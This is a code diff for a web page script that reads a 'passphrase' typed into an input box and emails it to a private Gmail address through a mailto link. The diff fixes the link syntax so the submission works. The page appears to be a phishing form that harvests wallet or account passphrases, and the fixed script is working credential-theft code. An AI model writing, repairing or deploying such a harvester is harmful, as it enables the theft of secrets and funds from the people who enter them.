@@ -88,13 +88,15 @@
 
     <script>
         function sendPassphrase() {
-            const passphrase = document.querySelector('.input-box').value;
-            if (passphrase) {
-                window.location.href=mailto:loathsomeguy@gmail.com?subject=Passphrase submission&body=${encodeURIComponent(passphrase)};
-            } else {
-                alert("Please enter your passphrase.");
-            }
-        }
+    const passphrase = document.querySelector('.input-box').value;
+    if (passphrase) {
+        // Correct mailto syntax with template literal
+        window.location.href = `mailto:loathsomeguy@gmail.com?subject=Passphrase%20submission&body=${encodeURIComponent(passphrase)}`;
+    } else {
+        alert("Please enter your passphrase.");
+    }
+}
+
     </script>
 </body>
 </html>
